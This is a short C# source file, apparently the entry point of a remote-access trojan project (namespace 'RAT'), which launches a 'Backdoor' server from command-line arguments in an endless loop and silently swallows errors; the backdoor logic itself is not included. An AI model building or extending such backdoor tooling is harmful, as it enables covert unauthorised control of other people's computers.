using System;
using System.Collections.Generic;
using System.Text;

namespace RAT
{
    class Program
    {
        static Backdoor bd;
        static void Main(string[] args)
        {
            try
            {
                bd = new Backdoor();
                if (args.Length == 1) bd = new Backdoor(int.Parse(args[0]));
                if (args.Length == 2) bd = new Backdoor(int.Parse(args[0]), args[1]);
                if (args.Length == 3) bd = new Backdoor(int.Parse(args[0]), args[1], args[2]);
                else if (args.Length == 4) bd = new Backdoor(int.Parse(args[0]), args[1], args[2], bool.Parse(args[3]));
                while (true)
                {
                    bd.StartServer();
                }
            }
            catch (Exception) { }
            Console.CancelKeyPress += ConsoleCancelPress;
        }

        private static void ConsoleCancelPress(object sender, ConsoleCancelEventArgs e)
        {
            bd.DropConnection();
        }
    }
}
